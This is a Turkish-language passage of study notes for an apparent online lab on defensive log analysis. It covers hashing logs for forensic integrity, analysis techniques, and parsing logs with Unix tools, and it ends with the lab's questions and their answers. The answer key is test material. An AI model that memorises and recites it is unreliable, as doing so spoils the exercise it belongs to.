Ancak, olay müdahalesi sırasında olduğu gibi anında veri analizinin gerektiği senaryolarda, Linux tabanlı sistemler günlük dosyalarının karma işlemini yapmak için sha256sum ile birlikte cat, grep, sed, sort, uniq ve awk gibi varsayılan araçları kullanabilir. Windows tabanlı sistemler benzer amaçlar için EZ-Tools ve varsayılan cmdlet Get-FileHash'i kullanabilir. Bu araçlar, bu durumlara uygun olan hızlı ayrıştırma ve analiz sağlar. Ayrıca, bir mahkemede kabul edilebilirliğini sağlamak için toplama sırasında günlük dosyasının karma değerini alarak uygun edinim gözlemlenmelidir.
Bu nedenle, yalnızca olayları kaydetmek değil, aynı zamanda bütünlüklerini sağlamak, analiz etmek ve günlüklerden elde edilen dersleri öğrenmek de zorunludur, çünkü bir kuruluşun güvenliği ve verimliliği bunlara bağlı olabilir.


**Log Analizi Teknikleri**

Log analiz teknikleri, log(kayıt) verilerinden içgörüler yorumlamak ve türetmek için kullanılan yöntemler veya uygulamalardır. 
Bu teknikler basit olandan karmaşığa kadar değişebilir ve kalıpları, anomalileri ve kritik içgörüleri belirlemek için hayati önem taşır.
İşte bazı yaygın teknikler:
	Kalıp Tanıma: Bu, günlük verilerindeki yinelenen dizileri veya eğilimleri belirlemeyi içerir. 
Düzenli sistem davranışını tespit edebilir veya bir güvenlik tehdidini gösterebilecek alışılmadık etkinlikleri belirleyebilir.
	Anomali Algılama: Anomali algılama, beklenen kalıptan sapan veri noktalarını belirlemeye odaklanır.
Olası sorunları veya kötü amaçlı etkinlikleri erken tespit etmek çok önemlidir.
	Korelasyon Analizi: Farklı log girişlerini ilişkilendirmek, çeşitli olaylar arasındaki ilişkiyi anlamaya yardımcı olur. 
Sistem bileşenleri arasındaki nedenselliği ve bağımlılıkları ortaya çıkarabilir ve kök neden analizinde hayati önem taşır.
	Zaman Çizelgesi Analizi: Kayıtları zaman içinde analiz etmek, eğilimleri, mevsimsellikleri ve periyodik davranışları anlamaya yardımcı olur. 
Performans izleme ve sistem yüklerini tahmin etmek için önemli olabilir.
	Makine Öğrenimi ve Yapay Zeka: Makine öğrenimi modellerinden yararlanmak, sınıflandırma ve zenginleştirme gibi çeşitli log analiz tekniklerini otomatikleştirebilir ve geliştirebilir. 
Yapay zeka, öngörücü içgörüler sağlayabilir ve belirli olaylara verilen yanıtların otomatikleştirilmesine yardımcı olabilir.
	Görselleştirme: Log verilerinin grafikler ve çizelgeler aracılığıyla gösterilmesi, sezgisel anlayış ve hızlı içgörüler sağlar.
Görselleştirme, karmaşık verileri daha erişilebilir hale getirebilir ve temel kalıpları ve ilişkileri belirlemeye yardımcı olabilir.
	İstatistiksel Analiz: Log verilerini analiz etmek için istatistiksel yöntemlerin kullanılması, niceliksel içgörüler sağlayabilir ve veri odaklı kararlar almaya yardımcı olabilir.
Regresyon analizi ve hipotez testi, ilişkileri çıkarabilir ve varsayımları doğrulayabilir.
Bu teknikler, log analiz görevinin belirli gereksinimlerine ve karmaşıklığına bağlı olarak tek tek veya birlikte uygulanabilir. 
Bu teknikleri anlamak ve kullanmak, log  analizinin etkinliğini önemli ölçüde artırabilir, daha bilinçli kararlara ve sağlam güvenlik önlemlerine yol açabilir.

*Kayıtlarla Çalışma: Pratik Uygulama*
Kayıtlarla(log) çalışmak, verilerin hem anlaşılmasını hem de işlenmesini gerektiren karmaşık bir görevdir. Bu eğitim iki senaryoyu kapsar. 
Birincisi, doğrudan açık kaynaklı bir Kayıt Görüntüleyici aracı aracılığıyla erişilen ayrıştırılmamış ham kayıt dosyalarının işlenmesidir. 
Bu yöntem, ön işleme gerek kalmadan anında analiz yapılmasını sağlar ve bu da hızlı incelemeler veya orijinal biçimin korunması için idealdir.
İkinci senaryo, cat, grep, sed, sort, uniq ve awk gibi Unix araçlarını kullanarak ayrıştırılmış ve birleştirilmiş bir kayıtdosyası oluşturmaya odaklanır.
Standartlaştırılmış bir dosya oluşturmak için günlükleri birleştirmeyi, filtrelemeyi ve biçimlendirmeyi içerir. 
Kayıt  Görüntüleyici aracı aracılığıyla erişilebilen bu birleştirilmiş dosya, verilerin net ve etkili bir görünümünü sunarak kalıpları ve sorunları belirlemeye yardımcı olur.
Bu yaklaşımlar, sistem tanılama ve siber güvenlikte log analizinin esnekliğini ve önemini vurgular.
İster ham ister ayrıştırılmış günlükler kullanılsın, verileri derleme, görüntüleme ve analiz etme yeteneği bir kuruluşun güvenliği ve verimliliği için hayati önem taşır.

*Ayrıştırılmamış Ham Log Dosyaları*

Ham log dosyalarıyla uğraşırken, URL'deki yolları belirterek bunlara doğrudan Günlük Görüntüleyici aracıyla erişebilirsiniz.
İşte birden fazla log dosyası içeren bir örnek URL:
![ayrilmamis_log](https://github.com/user-attachments/assets/30fbc73f-028a-464c-b1cc-ecaf281c26d3)

Log Viewer aracını kullanarak ayrıştırılmamış ham günlük dosyalarını görüntülemek için bu URL'yi tarayıcınıza yapıştırın.
NOT: URL'ye AttackBox veya VM tarayıcısını kullanarak erişebilirsiniz. Ancak, lütfen VM'deki Firefox'un başlatılmasının birkaç dakika sürebileceğini unutmayın.

**Ayrıştırılmış ve Birleştirilmiş Log Dosyası**
Ayrıştırılmış ve birleştirilmiş bir günlük dosyası oluşturmak için cat, grep, sed, sort, uniq ve awk gibi Unix araçlarının bir kombinasyonunu kullanabilirsiniz. İşte adım adım bir kılavuz:
1.	Log  girişlerini istenen biçime normalleştirmek için awk ve sed kullanın. Bu örnek için tarihe ve saate göre sıralayacağız:
![proses_giris](https://github.com/user-attachments/assets/ec4606bb-54f7-4068-a31a-505bd730a1be)

2.	İsteğe bağlı: Belirli girdileri filtrelemek için grep'i kullanın:
![grep](https://github.com/user-attachments/assets/01606daf-9567-4f49-975f-74c703d8c9dc)

3.	Tüm log girişlerini tarih ve saate göre sıralamak için sort'u kullanın:

![sort](https://github.com/user-attachments/assets/bde77e04-e4aa-4639-9b86-ea406a247328)

4. Yinelenen girdileri kaldırmak için uniq'i kullanın:

![sort_parsel](https://github.com/user-attachments/assets/9624a821-98d1-45c2-89f2-2686bb40ddfa)

NOT: URL'ye AttackBox veya VM tarayıcısını kullanarak erişebilirsiniz. 
Ancak, VM'deki Firefox'un başlatılmasının birkaç dakika sürebileceğini lütfen unutmayın.

** Ayrıştırılmamış ham kayıtk dosyaları için kayıt görüntüleyici URL'sine erişildiğinde, farklı filtreler seçildiğinde
"/var/log/websrv-02/rsyslog_cron.log" hangi hatayı gösteriyor?**
**Cevap:**: No date field

** Ayrıştırılmış verilerin daha kolay okunabilir ve sorgulanabilir bir biçime standartlaştırılması süreci nedir?**
**Cevap**: Normalisation

** Belirli bir IP adresine ilişkin faaliyetlerin analizini geliştirmek için normalleştirilmiş günlükleri birleştirme süreci nedir?**
**Cevap:** Enrichment




